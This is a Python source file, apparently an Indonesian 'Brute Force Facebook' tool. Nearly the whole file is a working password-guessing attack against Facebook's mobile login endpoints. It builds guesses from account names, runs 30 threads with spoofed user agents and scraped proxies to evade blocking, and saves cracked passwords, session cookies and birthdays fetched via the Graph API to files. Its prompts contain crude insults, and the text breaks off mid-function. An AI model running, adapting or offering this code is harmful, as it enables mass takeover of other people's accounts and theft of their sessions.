# coding=utf-8

#     *Brute Force Facebook (BFF)²
#     *file name: main.py
#     *copyright: (C) © 2022 ~ Romi Afrizal
#     *contact me on whatsap: +6281273018924

#     *Terimakasih sudah decode script ini tolong jangan di perjual belikan :)*
#     *Thanks for decoding this script, please don't sell it :)*

#--- MODULE IN PYTHON
from xyz import *
from concurrent.futures import ThreadPoolExecutor as Romz_Xyz
from bs4 import BeautifulSoup as parser
from random import randint
from xyz import done as selesai
#--- RICH PROGRESS
from rich.progress import Progress
from rich.progress import BarColumn
from rich.progress import TextColumn
from rich.progress import SpinnerColumn

#--- TANGGAL BULAN 
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month 

waktu = ("{}-{}-{}").format(hari,bulan,tahun)
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

#--- APPEND
user,sukses,check,lopev = [],[],[],0
til = '•'

#--- MULAI CRACK 
class Crack:
	
	def __init__(self):
		self.id,self.idx,self.ua,self.prx,self.uaxz, self.uaromz = [],[],[],[],[],[] 
		self.url_prok = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=100000&country=all&ssl=all&anonymity=all"
		self.romzz = requests.Session()
	
	#--- EKSEKUSI 
	def romiy(self,id):
		self.idx = id 
		tulis(Panel(f""" {Te}{U}• {P}01{O} Crack dari ID tua\n {U}• {P}02{O} Crack dari ID muda\n {U}• {P}03{O} Crack dari ID acak""",
		title = f'{Te}{M}[ {H}Urutan ID {M}]',style='#FF0022'))
		urut = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
		if urut in['']:
			exit("%s╰─%s isi yang benar kentod "%(p,m));jeda(2)
		elif urut in['1','01']:
			for kondom in self.idx:
				self.id.append(kondom)
		elif urut in['2','02']:
			for kondom in self.idx:
				self.id.insert(0,kondom)
		else:
			for kondom in self.idx:
				acak = random.randint(0,len(self.id))
				self.id.insert(acak,kondom)
		self.useragent()
		if 'rndm' in self.uaxz:
			unikersx = input('%s╰─%s gunakan password manual? y/t%s > %s'%(p,o,m,k))
			if unikersx in ('Y', 'y'):
				self.manualx()
			elif unikersx in ('T', 't'):
				tulis(Panel(f""" {Te}{U}• {P}01{O} methode{M} free{O} (cepat)\n {U}• {P}02{O} methode{P} mbasic{O} (lambat)\n {U}• {P}03{O} methode{H} mobile{O} (sangat lambat) {H}disarankan""",title = f'{Te}{M}[ {H}Methode {M}]',style='#FF0022'))
				self.langsungx()
			else:
				exit("%s╰─%s isi yang benar "%(p,m));jeda(2)
		else:
			pass
		unikers = input('%s╰─%s gunakan password manual? y/t%s > %s'%(p,o,m,k))
		if unikers in ('Y', 'y'):
			self.manual()
		elif unikers in ('T', 't'):
			tulis(Panel(f""" {Te}{U}• {P}01{O} methode{M} free{O} (cepat)\n {U}• {P}02{O} methode{P} mbasic{O} (lambat)\n {U}• {P}03{O} methode{H} mobile{O} (sangat lambat) {H}disarankan""",title = f'{Te}{M}[ {H}Methode {M}]',style='#FF0022'))
			self.langsung()
		else:
			exit("%s╰─%s isi yang benar "%(p,m));jeda(2)
				
	#--- SETTING PROXY
	def set_prox(self):
		sleeh = input('%s╰─%s anda ingin gunakan proxy? y/t%s > %s'%(p,o,m,k))
		if sleeh in['y','Y']:
			self.prx.append('prox')
			self.proxy_();jeda(2)
		else:
			pass
	
	#--- PROXY
	def proxy_(self):
		try:
			kontols = self.romzz.get(self.url_prok).text
		except Exception as e:
			exit(e)
		return kontols
			
	#--- SETTING USER AGENT
	def useragent(self):
		tulis(Panel(f"""{Te}{U} •{P} 01 {O}Gunakan user agent bawaan script
{U} •{P} 02 {O}Gunakan user agent random (48)
{U} •{P} 03 {O}Gunakan user agent anda sendiri""",
		title=f"{Te}{M}[{H} User agent{M} ]",style='#FF0022'))
		_romz_ = input('%s╰─%s Pilih%s >%s '%(p,o,m,k))
		if _romz_ == '':
			exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
		elif _romz_ in["1","01"]:
			try:
				ua_bawaan = ("Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]")
				open('ugent.txt','w').write(ua_bawaan)
			except:
				pass
		elif _romz_ in["2","02"]:
			self.uaxz.append("rndm")
		elif _romz_ in["3","03"]:
			tulis(Panel(f"{Te}{U} •{O} Ketik {H}My user agent{O} di browser google chrome\n {U}•{O} untuk mendapatkan user agent hp anda",style='#FF0022'))
			try:
				xix = input("%s╰─%s masukan user agent %s> %s"%(p,o,m,h))
				if xix in['',' ']:
					try:
						kontol = self.user_agentAPI()
						open('ugent.txt','w').write(kontol)
					except:
						pass
				else:
					open('ugent.txt','w').write(xix)
			except:
				pass
		elif _romz_ in["4","04"]:
			try:
				kontol = open('ugent.txt', 'r').read();jeda(2)
			except (FileNotFoundError,IOError,KeyError):
				kontol = '-'
			tulis(Panel(f"{Te}{O}{kontol}",title=f"{Te}{M}[{H} User agent anda{M} ]",style='#FF0022'))
		else:
			pass
		
	#--- 48 USER AGENT
	def user_agentAPI(self):
		ugent =[
			"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
			"Mozilla/5.0 (Linux; U; Android 12; en-US; SM-A2829J) AppleWebKit/537.36 (KHTML, like Gecko)  UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 10; Pixel Build/QP1A.190711.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]",
			"Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3396.81 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12",
			"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36","Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36","Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE5-00/071.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.26 Mobile Safari/533.4 3gpp-gba",
			"Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
			"[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]",
			"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]",
			"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
			"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)","Mozilla/5.0 (Series40; Nokia501/1.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.0.0.0.67",
			"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4","Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11",
			"Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaE7-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1","Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5230/51.0.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", 
			"Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaC6-01/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1", "Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", 
			"Mozilla/5.0 (Series40; Nokia303/14.87; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Symbian/3; Series60/5.3 Nokia500/111.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1","Mozilla/5.0 (Series40; Nokia110/03.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.62.10",
			"Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/3.9.0.0.22", "Mozilla/5.0 (Series40; Nokia205/03.18; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45","Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC5-06/23.6.015; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4", 
			"Mozilla/5.0 (Series40; Nokia200/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia208/03.39; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45","Mozilla/5.0 (Series40; Nokia2700c-2/07.80; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45",
			"Mozilla/5.0 (Series40; Nokia205/03.19; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45",  "Mozilla/5.0 (Series40; Nokia205.1/04.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45", "Mozilla/5.0 (Series40; Nokia201/11.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14",
		]
		rand_ua = random.choice(ugent)
		return rand_ua 
	
	#--- MANUAL PASS
	def manual(self): 
		global prog,des 
		tulis(Panel(f'{Te}{U} •{O} contoh{M} >{O} sayang{M},{O}pengen{M},{O}ngentod',style='#FF0022'))
		pwek = input('%s╰─%s password %s> %s'%(p,o,m,k))
		if pwek == '':
			exit('%s╰─%s jangan kosong'%(p,m))
		elif len(pwek)<=5:
			exit('%s╰─%s password minimal 6 karakter'%(p,m))
		else:
			pass 
		tulis(Panel(f""" {Te}{U}• {P}01{O} methode{M} free{O} (cepat)\n {U}• {P}02{O} methode{P} mbasic{O} (lambat)\n {U}• {P}03{O} methode{H} mobile{O} (sangat lambat) {H}disarankan""",title = f'{Te}{M}[ {H}Methode {M}]',style='#FF0022'))
		sluut = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
		self.set_prox()
		tulis(Panel(f'{Te}{U} {til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}OK/{waktu}.txt \n{U} {til}{O} akun {K}[CP] {O}tersimpan ke file {M}> {K}OK/{waktu}.txt \n {U}!{O} setiap crack 1k ID, mainkan mode pesawat 2 detik',style='#FF0022'))
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		des = prog.add_task('',total=len(self.id))
		with prog:
			with Romz_Xyz(max_workers=30) as titid:
				for akun in self.id:
					pwx = []
					uid = akun.split('<=>')[0]
					pwx = pwek.split(",")
					if sluut in[""," "]:
						exit("%s╰─%s Isi yang benar kentod "%(p,m));jeda(2)
					elif sluut in ["1","01"]:
						titid.submit(self.Cracker, uid, pwx, "free.facebook.com")
					elif sluut in ["2","02"]: 
						titid.submit(self.Cracker, uid, pwx, "mbasic.facebook.com")
					elif sluut in ["3","03"]: 
						titid.submit(self.Cracker, uid, pwx, "m.facebook.com")
					else:
						exit("%s╰─%s Isi yang benar kentod "%(p,m));jeda(2)
						
		selesai.hasil(sukses,check)
	
	#--- LANGSUNG
	def langsung(self): 
		global prog,des 
		sluut = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
		self.set_prox()
		tulis(Panel(f'{Te}{U} {til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}OK/{waktu}.txt \n{U} {til}{O} akun {K}[CP] {O}tersimpan ke file {M}> {K}OK/{waktu}.txt \n {U}!{O} setiap crack 1k ID, mainkan mode pesawat 2 detik',style='#FF0022'))
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		des = prog.add_task('',total=len(self.id))
		with prog:
			with Romz_Xyz(max_workers=30) as titid:
				for akun in self.id:
					pwx = []
					uid, name = akun.split("<=>")
					na = name.split(' ')
					if len(na) == 3 or len(na) == 4 or len(na) == 5 or len(na) == 6:
						pwx.append(name)
						pwx.append(na[0]+"123")
						pwx.append(na[0]+"12345")
					else:
						pwx.append(name)
						pwx.append(na[0]+"123")
						pwx.append(na[0]+"12345")
					if sluut in[""," "]:
						exit("%s╰─%s Isi yang benar kentod "%(p,m));jeda(2)
					elif sluut in ["1","01"]:
						titid.submit(self.Cracker, uid, pwx, "free.facebook.com")
					elif sluut in ["2","02"]: 
						titid.submit(self.Cracker, uid, pwx, "mbasic.facebook.com")
					elif sluut in ["3","03"]: 
						titid.submit(self.Cracker, uid, pwx, "m.facebook.com")
					else:
						exit("%s╰─%s Isi yang benar kentod "%(p,m));jeda(2)
							
		selesai.hasil(sukses,check)
		
	#--- MULAI COLAY
	def Cracker(self, user, peweh, url_log):
		try:
			global sukses,check,lopev,zooz,soos 
			prog.update(des,description=f'{Te}{H}[OK{M}:{H}{len(sukses)}]{O}-{K}[CP{M}:{K}{len(check)}] {O}{lopev}/{len(self.id)}')
			prog.advance(des)
			for xyz_ in peweh:
				pw = xyz_.lower()
				ses = requests.Session()
				uas = open('ugent.txt','r').read()
				zooz ={
						'Host': url_log,
						'content-length': str(random.randint(100, 300)),
						'cache-control': 'max-age=0',
						'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
						'sec-ch-ua-mobile': '?1',
						'sec-ch-ua-platform': '"Android"',
						'upgrade-insecure-requests': '1',
						'origin': 'https://'+url_log,
						'content-type': 'application/x-www-form-urlencoded',
						'user-agent': uas,
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
						'sec-fetch-site': 'same-origin',
						'sec-fetch-mode': 'navigate',
						'sec-fetch-user': '?1',
						'sec-fetch-dest': 'document', 
						'referer': 'https://'+url_log+'/login/?ref=dbl&fl'
					}
				if 'prox' in self.prx:
					xoox = random.choice(self.proxy_())
					proox = {"http": "socks4://"+xoox}
					pex = ses.get(f"https://{url_log}/login/?source=auth_switcher").text 
					dataa ={
						"lsd":re.search('name="lsd" value="(.*?)"', str(pex)).group(1),
						"jazoest":re.search('name="jazoest" value="(.*?)"', str(pex)).group(1),
						"email":user,
						"pass":pw,
						"next":f"https://{url_log}/login/save-device/?login_source=login"
					}
					po = ses.post(f"https://{url_log}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl",data=dataa,headers=zooz,proxies=proox,allow_redirects = False)
				else:
					pex = ses.get(f"https://{url_log}/login/?source=auth_switcher").text 
					dataa ={
						"lsd":re.search('name="lsd" value="(.*?)"', str(pex)).group(1),
						"jazoest":re.search('name="jazoest" value="(.*?)"', str(pex)).group(1),
						"email":user,
						"pass":pw,
						"next":f"https://{url_log}/login/save-device/?login_source=login"
					}
					po = ses.post(f"https://{url_log}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl",data=dataa,headers=zooz,allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					try:
						romz = ses.cookies.get_dict()
						kukis = ";".join([key+"="+value for key, value in romz.items()])
						token_ = open('data/token.txt', 'r').read()
						cooki_ = {"cookie":open("data/cookie.txt","r").read()} 
						lahir = json.loads(ses.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={token_}",cookies=cooki_).text)["birthday"] 
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print (f'\r{p}└───{h} {user} ◊ {pw} \n{p}  └─{h} {day} {month} {year} \n{p}  └─ {h}{kukis} ')
						os.popen("play-audio data/dapet.mp3")
						sukses.append(f"{user} ◊ {pw} ◊ {day} {month} {year} ◊ {kukis} ")
						open(f'OK/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {day} {month} {year} ◊ {kukis} \n")
						self.cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print (f'\r{p}└─── {h}{user} ◊ {pw} \n{p}  └─ {h}{kukis} ')
					os.popen("play-audio data/dapet.mp3")
					sukses.append(f'{user} ◊ {pw} ◊ {kukis}')
					open(f'OK/{waktu}.txt', 'a').write(f' *--> {user} ◊ {pw} ◊ {kukis}\n')
					self.cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						token_ = open('data/token.txt', 'r').read()
						cooki_ = {"cookie":open("data/cookie.txt","r").read()} 
						lahir = json.loads(ses.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={token_}",cookies=cooki_).text)["birthday"]
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print (f'\r{p}└─── {k}{user} ◊ {pw} \n{p}  └─ {k}{day} {month} {year}  ')
						os.popen("play-audio data/dapet.mp3")
						check.append(f"{user} ◊ {pw} ◊ {day} {month} {year}")
						open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {day} {month} {year} \n")
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print (f'\r{p}└─── {k}{user} ◊ {pw}           ')
					os.popen("play-audio data/dapet.mp3")
					check.append(f'{user} ◊ {pw}')
					open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw}\n")
					break
				else:
					continue
					
			lopev +=1
		except:
			self.Cracker(user, peweh, url_log)
	
#---------------------------------------------------------------------------------------------------------------#
#------ CRACK DENGAN USER AGENT RANDOM
#---------------------------------------------------------------------------------------------------------------#

	#--- MANUAL PASS
	def manualx(self): 
		global prog,des 
		tulis(Panel(f'{Te}{U} •{O} contoh{M} >{O} sayang{M},{O}pengen{M},{O}ngentod',style='#FF0022'))
		pwek = input('%s╰─%s password %s> %s'%(p,o,m,k))
		if pwek == '':
			exit('%s╰─%s jangan kosong'%(p,m))
		elif len(pwek)<=5:
			exit('%s╰─%s password minimal 6 karakter'%(p,m))
		else:
			pass 
		tulis(Panel(f""" {Te}{U}• {P}01{O} methode{M} free{O} (cepat)\n {U}• {P}02{O} methode{P} mbasic{O} (lambat)\n {U}• {P}03{O} methode{H} mobile{O} (sangat lambat) {H}disarankan""",title = f'{Te}{M}[ {H}Methode {M}]',style='#FF0022'))
		sluut = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
		self.set_prox()
		tulis(Panel(f'{Te}{U} {til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}OK/{waktu}.txt \n{U} {til}{O} akun {K}[CP] {O}tersimpan ke file {M}> {K}OK/{waktu}.txt \n {U}!{O} setiap crack 1k ID, mainkan mode pesawat 2 detik',style='#FF0022'))
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		des = prog.add_task('',total=len(self.id))
		with prog:
			with Romz_Xyz(max_workers=30) as titid:
				for akun in self.id:
					pwx = []
					uid = akun.split('<=>')[0]
					pwx = pwek.split(",")
					if sluut in[""," "]:
						exit("%s╰─%s Isi yang benar kentod "%(p,m));jeda(2)
					elif sluut in ["1","01"]:
						titid.submit(self.Crackers, uid, pwx, "free.facebook.com")
					elif sluut in ["2","02"]: 
						titid.submit(self.Crackers, uid, pwx, "mbasic.facebook.com")
					elif sluut in ["3","03"]: 
						titid.submit(self.Crackers, uid, pwx, "m.facebook.com")
					else:
						exit("%s╰─%s Isi yang benar kentod "%(p,m));jeda(2)
						
		selesai.hasil(sukses,check)
	
	#--- LANGSUNG
	def langsungx(self): 
		global prog,des 
		sluut = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
		self.set_prox()
		tulis(Panel(f'{Te}{U} {til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}OK/{waktu}.txt \n{U} {til}{O} akun {K}[CP] {O}tersimpan ke file {M}> {K}OK/{waktu}.txt \n {U}!{O} setiap crack 1k ID, mainkan mode pesawat 2 detik',style='#FF0022'))
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		des = prog.add_task('',total=len(self.id))
		with prog:
			with Romz_Xyz(max_workers=30) as titid:
				for akun in self.id:
					pwx = []
					uid, name = akun.split("<=>")
					na = name.split(' ')
					if len(na) == 3 or len(na) == 4 or len(na) == 5 or len(na) == 6:
						pwx.append(name)
						pwx.append(na[0]+"123")
						pwx.append(na[0]+"12345")
					else:
						pwx.append(name)
						pwx.append(na[0]+"123")
						pwx.append(na[0]+"12345")
					if sluut in[""," "]:
						exit("%s╰─%s Isi yang benar kentod "%(p,m));jeda(2)
					elif sluut in ["1","01"]:
						titid.submit(self.Crackers, uid, pwx, "free.facebook.com")
					elif sluut in ["2","02"]: 
						titid.submit(self.Crackers, uid, pwx, "mbasic.facebook.com")
					elif sluut in ["3","03"]: 
						titid.submit(self.Crackers, uid, pwx, "m.facebook.com")
					else:
						exit("%s╰─%s Isi yang benar kentod "%(p,m));jeda(2)
							
		selesai.hasil(sukses,check)
		
	#--- MULAI COLAY
	def Crackers(self, user, peweh, url_log):
		try:
			global sukses,check,lopev
			prog.update(des,description=f'{Te}{H}[OK{M}:{H}{len(sukses)}]{O}-{K}[CP{M}:{K}{len(check)}] {O}{lopev}/{len(self.id)}')
			prog.advance(des)
			for xyz_ in peweh:
				pw = xyz_.lower()
				ses = requests.Session()
				zooz ={
						'Host': url_log,
						'content-length': str(random.randint(100, 300)),
						'cache-control': 'max-age=0',
						'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
						'sec-ch-ua-mobile': '?1',
						'sec-ch-ua-platform': '"Android"',
						'upgrade-insecure-requests': '1',
						'origin': 'https://'+url_log,
						'content-type': 'application/x-www-form-urlencoded',
						'user-agent': uas,
						'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
						'sec-fetch-site': 'same-origin',
						'sec-fetch-mode': 'navigate',
						'sec-fetch-user': '?1',
						'sec-fetch-dest': 'document', 
						'referer': 'https://'+url_log+'/login/?ref=dbl&fl'
					}
				if 'prox' in self.prx:
					xoox = random.choice(self.proxy_())
					proox = {"http": "socks4://"+xoox}
					pex = ses.get(f"https://{url_log}/login/?source=auth_switcher").text 
					dataa ={
						"lsd":re.search('name="lsd" value="(.*?)"', str(pex)).group(1),
						"jazoest":re.search('name="jazoest" value="(.*?)"', str(pex)).group(1),
						"email":user,
						"pass":pw,
						"next":f"https://{url_log}/login/save-device/?login_source=login"
					}
					po = ses.post(f"https://{url_log}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl",data=dataa,headers=zooz,proxies=proox,allow_redirects = False)
				else:
					pex = ses.get(f"https://{url_log}/login/?source=auth_switcher").text 
					dataa ={
						"lsd":re.search('name="lsd" value="(.*?)"', str(pex)).group(1),
						"jazoest":re.search('name="jazoest" value="(.*?)"', str(pex)).group(1),
						"email":user,
						"pass":pw,
						"next":f"https://{url_log}/login/save-device/?login_source=login"
					}
					po = ses.post(f"https://{url_log}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl",data=dataa,headers=zooz,allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					try:
						romz = ses.cookies.get_dict()
						kukis = ";".join([key+"="+value for key, value in romz.items()])
						token_ = open('data/token.txt', 'r').read()
						cooki_ = {"cookie":open("data/cookie.txt","r").read()} 
						lahir = json.loads(ses.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={token_}",cookies=cooki_).text)["birthday"] 
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print(f'\r{p}└───{h} {user} ◊ {pw} \n{p}  └─{h} {day} {month} {year} \n{p}  └─ {h}{kukis} ')
						os.popen("play-audio data/dapet.mp3")
						sukses.append(f"{user} ◊ {pw} ◊ {day} {month} {year} ◊ {kukis} ")
						open(f'OK/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {day} {month} {year} ◊ {kukis} \n")
						self.cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print (f'\r{p}└─── {h}{user} ◊ {pw} \n{p}  └─ {h}{kukis} ')
					os.popen("play-audio data/dapet.mp3")
					sukses.append(f'{user} ◊ {pw} ◊ {kukis}')
					open(f'OK/{waktu}.txt', 'a').write(f' *--> {user} ◊ {pw} ◊ {kukis}\n')
					self.cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						token_ = open('data/token.txt', 'r').read()
						cooki_ = {"cookie":open("data/cookie.txt","r").read()} 
						lahir = json.loads(ses.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={token_}",cookies=cooki_).text)["birthday"]
						day, month, year = lahir.split('/')
						month = bulan12[month]
